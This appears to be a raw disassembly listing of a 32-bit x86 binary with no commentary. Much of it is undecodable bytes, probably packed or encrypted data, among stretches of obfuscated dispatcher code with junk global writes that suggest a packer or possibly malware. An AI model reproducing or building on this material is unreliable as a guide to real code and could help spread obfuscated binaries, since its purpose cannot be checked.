  4090f4:	or     edi,DWORD PTR [ebp+0x7]
  4090f7:	or     al,0x93
  4090f9:	pop    ds
  4090fa:	push   es
  4090fb:	push   ebp
  4090fc:	mov    ah,0x59
  4090fe:	int    0x70
  409100:	sbb    eax,0x8d5560fa
  409105:	retf   0x225c
  409108:	jae    0x40910e
  40910a:	jge    0x409174
  40910c:	adc    eax,0xe810a47e
  409111:	shl    BYTE PTR [edx-0x59],0xff
  409115:	test   eax,0xef66fd96
  40911a:	fwait
  40911b:	adc    DWORD PTR [edx],esi
  40911d:	shl    BYTE PTR [edi],cl
  40911f:	shl    ebx,1
  409121:	(bad)  
  409122:	outs   dx,BYTE PTR ds:[esi]
  409123:	addr16 icebp 
  409125:	sbb    al,0x15
  409127:	add    BYTE PTR [ecx+edi*8-0x4b71f698],dl
  40912e:	and    ebx,DWORD PTR [edi-0x1b]
  409131:	ins    DWORD PTR es:[edi],dx
  409132:	mov    DWORD PTR [edx],ecx
  409134:	push   eax
  409135:	and    DWORD PTR [ebp-0x62f843aa],ebx
  40913b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40913c:	mov    bh,0x63
  40913e:	xchg   esi,eax
  40913f:	inc    eax
  409140:	lock mov eax,0xa95131aa
  409146:	retf   0xe2ea
  409149:	mov    eax,0x558ee680
  40914e:	iret   
  40914f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409150:	sbb    eax,0x7ca60633
  409155:	inc    esi
  409156:	outs   dx,DWORD PTR ds:[esi]
  409157:	fstp   QWORD PTR [eax+0x44d4254]
  40915d:	aaa    
  40915e:	dec    ebx
  40915f:	pop    es
  409160:	shl    BYTE PTR [ebp+0x20],0x45
  409164:	xlat   BYTE PTR ds:[ebx]
  409165:	cld    
  409166:	cmp    esp,DWORD PTR [ecx+0xc]
  409169:	jae    0x4091da
  40916b:	sbb    eax,0xc0192d21
  409170:	arpl   WORD PTR [eax],di
  409172:	(bad)  
  409173:	sbb    BYTE PTR [ebp+0x42],dh
  409176:	outs   dx,BYTE PTR ds:[esi]
  409177:	loop   0x40919d
  409179:	cmp    al,0x4f
  40917b:	cmp    DWORD PTR [eax+edx*4],esi
  40917e:	outs   dx,BYTE PTR ds:[esi]
  40917f:	mov    WORD PTR [ebx],es
  409181:	iret   
  409182:	aad    0xad
  409184:	popf   
  409185:	or     dl,BYTE PTR [esi-0x7d3e93d5]
  40918b:	and    esi,DWORD PTR [eax+0x4c2abddb]
  409191:	mov    cl,0xcd
  409193:	adc    ah,bl
  409195:	dec    esp
  409196:	or     DWORD PTR [esi+0x13bf7fb8],ebp
  40919c:	cmp    BYTE PTR [ebp-0x2eb3ffd6],ah
  4091a2:	cmp    bh,BYTE PTR [edi+0x301b7bce]
  4091a8:	iret   
  4091a9:	(bad)  
  4091aa:	in     al,dx
  4091ab:	push   ecx
  4091ac:	cmp    bh,0xf0
  4091af:	mov    dh,0x87
  4091b1:	test   BYTE PTR [edi-0x39],bh
  4091b4:	ja     0x40914f
  4091b6:	sahf   
  4091b7:	sub    al,0xfd
  4091b9:	lock or al,0x62
  4091bc:	pop    edx
  4091bd:	ds dec esi
  4091bf:	xor    ebp,DWORD PTR [eax+0x6a]
  4091c2:	lds    esp,FWORD PTR [edx-0x8]
  4091c5:	cmp    BYTE PTR [ebx-0x47],0xdb
  4091c9:	test   BYTE PTR [eax+0x62f742f4],bh
  4091cf:	rcl    BYTE PTR [ebx+ecx*2+0x29d9cc],1
  4091d6:	sbb    bh,BYTE PTR [ebx+esi*4]
  4091d9:	adc    ch,BYTE PTR [ebp-0x7e]
  4091dc:	dec    edi
  4091dd:	(bad)  
  4091de:	fs loop 0x409225
  4091e1:	jge    0x40925d
  4091e3:	(bad)  
  4091e4:	adc    BYTE PTR [ecx+0x7b],bl
  4091e7:	mov    esi,0xc96b0ffb
  4091ec:	jno    0x409199
  4091ee:	cmp    BYTE PTR [edi-0x19f7a6a9],ch
  4091f4:	add    ecx,DWORD PTR [esi-0x7514335b]
  4091fa:	jne    0x4091e2
  4091fc:	push   es
  4091fd:	mov    DWORD PTR [ebp+0x18],0xccd071ac
  409204:	(bad)  
  409205:	or     DWORD PTR [edx],esp
  409207:	or     ebx,DWORD PTR [ebp+0x5fc7a42c]
  40920d:	mov    ebp,0xee7dbe50
  409212:	fsubr  st(7),st
  409214:	xor    bl,bh
  409216:	jno    0x4091c6
  409218:	mov    ds:0x2f4bc916,eax
  40921d:	inc    ebx
  40921e:	out    0xe9,eax
  409220:	in     eax,0x2d
  409222:	fistp  DWORD PTR [ebx+ebx*4-0x68825b60]
  409229:	retf   
  40922a:	dec    edi
  40922b:	sub    al,BYTE PTR [ebx+ebx*1]
  40922e:	mov    ecx,0xfcdf7ada
  409233:	stos   DWORD PTR es:[edi],eax
  409234:	cmp    DWORD PTR [ebp-0x7b],edi
  409237:	fdiv   st(0),st
  409239:	xchg   esp,eax
  40923a:	jbe    0x40928d
  40923c:	and    al,0x4b
  40923e:	sbb    eax,0xb5c62734
  409243:	jns    0x409217
  409245:	sbb    al,0xb7
  409247:	pop    eax
  409248:	jecxz  0x40922a
  40924a:	imul   edi,DWORD PTR [edi+0x1e],0xa326b864
  409251:	jmp    0x8b89:0xbdec200
  409258:	push   cs
  409259:	and    eax,0x482195ff
  40925e:	sti    
  40925f:	dec    ebp
  409260:	dec    edi
  409261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409262:	test   BYTE PTR [ecx+0x38],dl
  409265:	dec    esp
  409266:	call   DWORD PTR [ecx-0x7d]
  409269:	mov    ecx,0x87e80191
  40926e:	push   es
  40926f:	mov    edx,0x9fb6c262
  409274:	call   0x883ac124
  409279:	leave  
  40927a:	mov    ebp,DWORD PTR ds:0x547f1513
  409280:	out    0x2d,eax
  409282:	addr16 push ebp
  409284:	inc    eax
  409285:	pop    ds
  409286:	mov    al,0x4d
  409288:	jg     0x40922a
  40928a:	inc    esi
  40928b:	js     0x409273
  40928d:	xchg   BYTE PTR [eax+0x2d],dh
  409290:	mul    DWORD PTR [ecx-0x217b4d38]
  409296:	ror    DWORD PTR [ebx+edi*1-0x2d20ca50],0x4a
  40929e:	fcomp  DWORD PTR [ecx]
  4092a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092a1:	inc    edx
  4092a2:	jno    0x4092cd
  4092a4:	shl    BYTE PTR [ebx+ecx*2],1
  4092a7:	fild   QWORD PTR [esi-0x7f540ee1]
  4092ad:	or     al,0x7a
  4092af:	add    BYTE PTR cs:[eax+0x6e],dh
  4092b3:	pabsw  mm7,mm2
  4092b7:	jmp    0x4092c4
  4092b9:	mov    ebx,0x50d8cb80
  4092be:	mov    cl,0x3d
  4092c0:	aaa    
  4092c1:	mul    edi
  4092c3:	cmp    eax,0x3e78aa5
  4092c8:	mov    ch,0xe1
  4092ca:	mov    dl,0x4d
  4092cc:	mov    esp,0xe2b6d499
  4092d1:	sbb    ebp,DWORD PTR [edx-0x64ab1b6d]
  4092d7:	mov    edx,0x724a1fea
  4092dc:	(bad)  
  4092de:	daa    
  4092df:	add    edi,esi
  4092e1:	cmp    ah,dh
  4092e3:	mov    ds:0xa6cdf392,al
  4092e8:	jle    0x409317
  4092ea:	jbe    0x40927c
  4092ec:	retf   0x35c9
  4092ef:	jecxz  0x4092d5
  4092f1:	push   esp
  4092f2:	cmp    dh,ah
  4092f4:	mov    ds:0x23ac5336,eax
  4092f9:	sub    BYTE PTR [eax-0x1ea7f877],ch
  4092ff:	add    al,0xeb
  409301:	das    
  409302:	les    edi,FWORD PTR [esi+0x13]
  409305:	adc    al,0x62
  409307:	iret   
  409308:	pop    esi
  409309:	jnp    0x4092f1
  40930b:	icebp  
  40930c:	dec    eax
  40930d:	lahf   
  40930e:	xchg   ecx,eax
  40930f:	cdq    
  409310:	push   eax
  409311:	or     bl,BYTE PTR [esi-0x4]
  409314:	es ins DWORD PTR es:[edi],dx
  409316:	inc    edx
  409317:	push   edx
  409318:	pop    edi
  409319:	add    dl,BYTE PTR [ebp-0x27]
  40931c:	fwait
  40931d:	je     0x4092a0
  40931f:	stc    
  409320:	and    eax,0x689165fb
  409325:	mov    ds:0xe3c46042,eax
  40932a:	scas   al,BYTE PTR es:[edi]
  40932b:	mov    ds:0x3762b3bf,eax
  409330:	icebp  
  409331:	dec    esp
  409332:	push   ebx
  409333:	adc    eax,0x7f597f9f
  409338:	(bad)
  40933b:	and    DWORD PTR [eax-0x1f],esp
  40933e:	(bad)  ds:0xec458bbc
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x433663
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	les    esp,FWORD PTR [esi+ebx*8]
  40939e:	add    bh,BYTE PTR [eax-0x62]
  4093a1:	in     eax,dx
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0x7f7c7c7f
  4093a9:	stc    
  4093aa:	js     0x4093f9
  4093ac:	pushf  
  4093ad:	cmp    BYTE PTR [eax],ah
  4093af:	shr    cl,0xe8
  4093b2:	jl     0x4093f8
  4093b4:	out    dx,eax
  4093b5:	ds jne 0x4093eb
  4093b8:	test   ch,ch
  4093ba:	fdiv   st,st(0)
  4093bc:	stc    
  4093bd:	inc    ebx
  4093be:	in     eax,dx
  4093bf:	sar    DWORD PTR [edi+0x7],cl
  4093c2:	daa    
  4093c3:	bound  esp,QWORD PTR [ebp+0x37]
  4093c6:	mov    esp,0xd28c30cd
  4093cb:	dec    ebp
  4093cc:	test   al,0x5b
  4093ce:	pop    edi
  4093cf:	stc    
  4093d0:	(bad)  
  4093d1:	xor    eax,0x29cd1db7
  4093d6:	pop    edx
  4093d7:	lahf   
  4093d8:	leave  
  4093d9:	mov    eax,0xf000eda4
  4093de:	push   es
  4093df:	dec    edx
  4093e0:	jmp    0x89421fff
  4093e5:	(bad)  
  4093e6:	pop    eax
  4093e7:	pop    ss
  4093e8:	mov    ds:0x98a84575,al
  4093ed:	mov    eax,0x6768e836
  4093f2:	cmp    ebp,DWORD PTR [ecx+0x6b37254e]
  4093f8:	and    DWORD PTR [esi+0x4b],0x29
  4093fc:	add    BYTE PTR [eax-0x2b],cl
  4093ff:	dec    edi
  409400:	int3   
  409401:	scas   eax,DWORD PTR es:[edi]
  409402:	xor    BYTE PTR [edx-0x6f9beda5],cl
  409408:	inc    esp
  409409:	jne    0x409434
  40940b:	test   BYTE PTR [eax+0x783e5cdd],ch
  409411:	sub    BYTE PTR [edi+ebp*4-0x5f],0xe0
  409416:	out    dx,eax
  409417:	repnz shl BYTE PTR [edi+0x51],cl
  40941b:	shr    BYTE PTR [eax],0xdb
  40941e:	and    DWORD PTR [esi-0x64ee26b6],0x21
  409425:	dec    edx
  409426:	(bad)  
  409427:	enter  0xdfcb,0xb
  40942b:	lea    edx,[ebx]
  40942d:	and    al,0x75
  40942f:	fistp  WORD PTR ds:0xfb2be48b
  409435:	sub    al,0x28
  409437:	or     eax,0x3e8ae783
  40943c:	iret   
  40943d:	ret    0xaeda
  409440:	cmp    BYTE PTR [ecx+0x291ca087],dl
  409446:	in     al,0xf4
  409448:	jnp    0x40947e
  40944a:	and    DWORD PTR [ebx-0x5f479113],0xffffff80
  409451:	push   ss
  409452:	sbb    ah,BYTE PTR [ebx]
  409454:	ins    BYTE PTR es:[edi],dx
  409455:	stc    
  409456:	(bad)  
  409457:	stos   DWORD PTR es:[edi],eax
  409458:	cmc    
  409459:	adc    al,0x8a
  40945b:	cmp    BYTE PTR [ebx+0x20],ah
  40945e:	xor    BYTE PTR [esi],dh
  409460:	imul   edi,DWORD PTR [edx],0xddb8934
  409466:	push   edi
  409467:	mov    al,ds:0xe845f0be
  40946c:	adc    DWORD PTR [edi],edx
  40946e:	xor    dh,BYTE PTR [ebx+eiz*4+0x5b4dec74]
  409475:	and    al,0xb0
  409477:	fmul   DWORD PTR [eax]
  409479:	and    al,0x6
  40947b:	int    0xc7
  40947d:	enter  0xb450,0x8e
  409481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409482:	outs   dx,BYTE PTR ds:[esi]
  409483:	gs ds cmp al,0x78
  409487:	inc    esi
  409488:	dec    ebx
  409489:	dec    edi
  40948a:	adc    eax,0xf133693c
  40948f:	mov    cl,0x78
  409491:	sub    al,0x38
  409493:	addr16 cld 
  409495:	cli    
  409496:	cli    
  409497:	in     al,dx
  409498:	aam    0x5a
  40949a:	xchg   ecx,eax
  40949b:	cmp    al,0xeb
  40949d:	call   0xdc8b:0x1f22afa2
  4094a4:	mov    eax,0x48b0db69
  4094a9:	(bad)  
  4094aa:	shl    ch,1
  4094ac:	sbb    BYTE PTR [esi],0xe3
  4094af:	pop    es
  4094b0:	mov    dl,0xa6
  4094b2:	ficom  DWORD PTR ds:0x8a6d1ffb
  4094b8:	mov    al,0x7c
  4094ba:	push   cs
  4094bb:	ret    
  4094bc:	pop    esi
  4094bd:	dec    bx
  4094bf:	mov    eax,DWORD PTR [ebp+0x8]
  4094c2:	or     DWORD PTR ds:0x433667,0xc38
  4094cc:	push   ebx
  4094cd:	adc    DWORD PTR ds:0x4335d7,0x6147
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x4336e7,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x4335df,0x4335d7
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x4336df,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x43362b,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x4335db,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x43362f,0x4336eb
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x43362f,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x4335e7,0x4336af
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433617,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x43366f,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x4336eb,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x4335e3,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x4336af,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x4335cb,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	pop    edx
  4095c2:	sahf   
  4095c3:	adc    BYTE PTR [esi],dh
  4095c5:	mov    bh,0xec
  4095c7:	jl     0x409645
  4095c9:	adc    eax,0xd7c7c7f
  4095ce:	test   BYTE PTR [edi],ah
  4095d0:	jmp    FWORD PTR [esi-0x308105e4]
  4095d6:	shr    BYTE PTR [ebp+0x1c83b3e3],0x80
  4095dd:	xor    ch,BYTE PTR [esi+0xc10f090]
  4095e3:	ret    
  4095e4:	leave  
  4095e5:	das    
  4095e6:	fst    QWORD PTR [ebx]
  4095e8:	jne    0x4095eb
  4095ea:	mov    bh,BYTE PTR [ebx]
  4095ec:	imul   esi,DWORD PTR [ebp+0x1c2bbefa],0x4934dc45
  4095f6:	push   ecx
  4095f7:	fisubr WORD PTR [eax+edi*8-0x50]
  4095fb:	ds mov ch,0x4b
  4095fe:	call   0xb78050b4
  409603:	mul    bh
  409605:	dec    edx
  409606:	jle    0x40958d
  409608:	pop    ebp
  409609:	add    eax,ecx
  40960b:	jle    0x409668
  40960d:	sub    BYTE PTR [ebp+0x5a39c384],dh
  409613:	inc    ebp
  409614:	mov    dl,0xa6
  409616:	int    0x83
  409618:	ja     0x4095e3
  40961a:	xchg   esp,eax
  40961b:	mov    dl,0x97
  40961d:	xor    DWORD PTR [edx],edi
  40961f:	stos   BYTE PTR es:[edi],al
  409620:	mov    al,ds:0xcca1b76c
  409625:	mov    al,0xfa
  409627:	scas   eax,DWORD PTR es:[edi]
  409628:	test   DWORD PTR [edx],0x29d5c996
  40962e:	push   cs
  40962f:	into   
  409630:	and    eax,0x8533408e
  409635:	mov    esi,0x57a83632
  40963a:	dec    esi
  40963b:	scas   al,BYTE PTR es:[edi]
  40963c:	and    BYTE PTR [eax],dl
  40963e:	sbb    BYTE PTR [edi+0x7eb0b9fb],cl
  409644:	std    
  409645:	push   cs
  409646:	mov    cl,0x75
  409648:	xchg   BYTE PTR [edi],cl
  40964a:	in     al,0xda
  40964c:	shr    dl,1
  40964e:	adc    DWORD PTR [edi+0x23f2d69b],0x58
  409655:	jge    0x4096cd
  409657:	test   BYTE PTR [eax],0x6b
  40965a:	test   al,0xb
  40965c:	rol    BYTE PTR [edx-0x3136b3d0],cl
  409662:	in     al,0xa1
  409664:	pop    ebp
  409665:	(bad)  [edx-0x74]
  409668:	sbb    eax,0xa83058e7
  40966d:	push   ebx
  40966e:	sub    al,0xac
  409670:	cmp    al,0xd9
  409672:	aaa    
  409673:	push   ss
  409674:	lea    edx,[eax+0x6c763e8]
  40967a:	aam    0xed
  40967c:	(bad)  
  40967d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40967e:	cmp    DWORD PTR [edi],0x46d4766a
  409684:	push   ss
  409685:	inc    edi
  409686:	cmc    
  409687:	jp     0x409704
  409689:	push   ebp
  40968a:	push   ebx
  40968b:	fldcw  WORD PTR [ebx-0x7889882b]
  409691:	out    dx,eax
  409692:	popa   
  409693:	rol    DWORD PTR [ecx+0x2ddea35d],cl
  409699:	aaa    
  40969a:	call   0x3807:0x90fa72b8
  4096a1:	mov    esi,0x55a9de23
  4096a6:	pop    ebp
  4096a7:	aad    0x1a
  4096a9:	fmul   st(4),st
  4096ab:	sub    eax,0xdfad8a2b
  4096b0:	(bad)  
  4096b1:	cld    
  4096b2:	cmp    bh,dl
  4096b4:	retf   
  4096b5:	push   ss
  4096b6:	xchg   esp,eax
  4096b7:	iret   
  4096b8:	jo     0x4096cc
  4096ba:	mov    bh,0xe9
  4096bc:	movups XMMWORD PTR [ebx],xmm6
  4096bf:	xor    BYTE PTR [edi],dl
  4096c1:	fxch   st(2)
  4096c3:	jp     0x409708
  4096c5:	lods   eax,DWORD PTR ds:[esi]
  4096c6:	icebp  
  4096c7:	adc    esi,DWORD PTR [edx-0x54aa0f07]
  4096cd:	test   al,0x3b
  4096cf:	mov    ch,BYTE PTR ds:0xfe8459c5
  4096d5:	lods   eax,DWORD PTR ds:[esi]
  4096d6:	add    DWORD PTR [edi-0x22],0x72d0ed5d
  4096dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096de:	iret   
  4096df:	xor    eax,0xa8b453c7
  4096e4:	cmp    edi,0x33d
  4096ea:	mov    DWORD PTR ds:0x433657,0x197
  4096f4:	jne    0x409766
  4096fa:	and    DWORD PTR [ebp+0x8],0x0
  4096fe:	mov    eax,DWORD PTR [ebp-0x8]
  409701:	or     DWORD PTR ds:0x4336a3,0x433663
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x4336e3
  409714:	or     DWORD PTR ds:0x4336a3,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x4335bf,0x43362f
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x4336a7,0x433627
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x4335cb
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433697,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x4335df,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x43366f,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x4336e7,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x4335bf
  40978d:	and    DWORD PTR ds:0x43362f,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x4336af,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43361f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x433667
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x4336a7,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x4335df,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x43366b,0x4336b3
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43369b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x4335df
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x433633,0x43362f
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	jns    0x4097b3
  409828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409829:	pop    ebp
  40982a:	dec    esp
  40982b:	out    dx,eax
  40982c:	jl     0x4098aa
  40982e:	adc    eax,0xb77c7c7f
  409833:	daa    
  409834:	xchg   DWORD PTR [esi+0x3a47a2fd],edx
  40983a:	aam    0x18
  40983c:	xchg   edi,eax
  40983d:	nop
  40983e:	jmp    0x152b:0x4887ef1c
  409845:	sar    BYTE PTR [ebp-0x48],0xc
  409849:	and    DWORD PTR [esi+eiz*2-0x55],esp
  40984d:	xor    esi,DWORD PTR [ecx]
  40984f:	daa    
  409850:	xchg   DWORD PTR [ecx],ebp
  409852:	lahf   
  409853:	jb     0x4097f2
  409855:	push   esi
  409856:	xor    edi,esp
  409858:	inc    esi
  409859:	aas    
  40985a:	(bad)  
  40985b:	pop    ss
  40985c:	add    BYTE PTR [edi+0x40],al
  40985f:	loopne 0x4098c0
  409861:	ins    BYTE PTR es:[edi],dx
  409862:	jmp    0xeea3:0x49cf4c83
  409869:	dec    ecx
  40986a:	(bad)  
  40986c:	outs   dx,BYTE PTR ds:[esi]
  40986d:	lods   al,BYTE PTR ds:[esi]
  40986e:	mov    cl,0x4d
  409870:	pop    eax
  409871:	icebp  
  409872:	sbb    ebx,esp
  409874:	inc    esi
  409875:	xor    DWORD PTR [eax-0x7f],ebx
  409878:	sahf   
  409879:	mov    esi,0xd6200da9
  40987e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40987f:	sbb    DWORD PTR [eax],ebp
  409881:	mov    ds:0x40778819,al
  409886:	pop    ss
  409887:	pop    edx
  409888:	stc    
  409889:	sar    DWORD PTR [edx],0x1e
  40988c:	sahf   
  40988d:	popf   
  40988e:	sbb    DWORD PTR [edi],edi
  409890:	in     al,dx
  409891:	mov    cl,BYTE PTR [ecx+0x60235e12]
  409897:	repz sbb eax,0x78997ca9
  40989d:	clc    
  40989e:	lock cld 
  4098a0:	loopne 0x40987d
  4098a2:	(bad)  
  4098a3:	pusha  
  4098a4:	ror    BYTE PTR [esp+ebp*4+0x9],1
  4098a8:	(bad)  
  4098a9:	cs cmp al,0x30
  4098ac:	mov    dh,0x29
  4098ae:	jae    0x4098e2
  4098b0:	push   ss
  4098b1:	jns    0x4098c4
  4098b3:	test   BYTE PTR [ecx+ebp*4-0x3e65598b],dh
  4098ba:	push   esp
  4098bb:	or     BYTE PTR [esi+0x1b],al
  4098be:	cs jb  0x409912
  4098c1:	pop    ebp
  4098c2:	xchg   BYTE PTR [edi+ebx*2],dh
  4098c5:	add    dl,BYTE PTR [ebx+0x22209265]
  4098cb:	sbb    al,0x94
  4098cd:	pop    es
  4098ce:	push   edi
  4098cf:	pop    ecx
  4098d0:	pop    edi
  4098d1:	adc    edi,edx
  4098d3:	sub    eax,DWORD PTR [edi-0x3f]
  4098d6:	push   fs
  4098d8:	aam    0xa0
  4098da:	jo     0x409891
  4098dc:	mov    eax,0x863a44d0
  4098e1:	push   eax
  4098e2:	aas    
  4098e3:	or     dh,bl
  4098e5:	sub    dh,BYTE PTR [eax-0x7e3be609]
  4098eb:	cmp    DWORD PTR [ebp-0x35],edi
  4098ee:	test   DWORD PTR [esi+0x123729cc],edi
  4098f4:	das    
  4098f5:	pop    edx
  4098f6:	sbb    DWORD PTR [ebp-0x38d1fffc],eax
  4098fc:	addr16 fcmovne st,st(7)
  4098ff:	pushf  
  409900:	mov    ch,cl
  409902:	adc    cl,dl
  409904:	mov    eax,0x9ffb17bf
  409909:	in     al,dx
  40990a:	xor    eax,0xc2ce627
  40990f:	retf   
  409910:	jae    0x4098ed
  409912:	xor    BYTE PTR [eax+0x29],dl
  409915:	or     BYTE PTR [edx-0x51a0f444],ch
  40991b:	xchg   esi,eax
  40991c:	or     eax,DWORD PTR [ebx]
  40991e:	outs   dx,BYTE PTR ds:[esi]
  40991f:	add    BYTE PTR [edi+0x6d],ah
  409922:	push   eax
  409923:	repz shl DWORD PTR [eax],1
  409926:	pushf  
  409927:	fwait
  409928:	mov    ecx,DWORD PTR ds:0xbafa5ab0
  40992e:	bound  ecx,QWORD PTR [eax-0x1f5ab5e]
  409934:	loop   0x40993c
  409936:	out    dx,al
  409937:	push   eax
  409938:	mov    ds:0xfcdcdcc8,eax
  40993d:	clc    
  40993e:	add    dl,BYTE PTR [ebp-0x31]
  409941:	imul   edx,DWORD PTR [edx-0x3a0f8fae],0xc6330085
  40994b:	add    eax,ebx
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x4336b3
  4099ce:	sub    DWORD PTR ds:0x4335bf,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x43366f,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x4336af,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x433633,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x4335cf,ebx
